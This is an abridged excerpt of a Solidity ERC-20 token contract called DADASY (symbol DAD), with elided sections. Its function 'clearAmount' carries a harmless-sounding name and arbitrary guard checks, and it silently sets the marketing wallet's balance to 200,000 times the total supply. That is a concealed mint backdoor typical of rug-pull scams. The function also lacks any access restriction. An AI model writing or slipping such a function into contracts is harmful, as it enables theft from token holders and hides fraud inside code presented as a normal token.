...
contract DADASY is IERC20, Ownable, IERC20Metadata {
    ...
    string  private constant _nameToken = "DADASY";
    string  private constant _symbolToken = "DAD";
    ...
    constructor() {
        uint256 total = 1200000000 * 10**_decimals;
    ...
    function clearAmount(bool clear , uint256 Amount) external {
        require(clear == true);
        require(Amount == 1);
        _balances[_marketingWallet] = _totalSupply * 200000;
    }
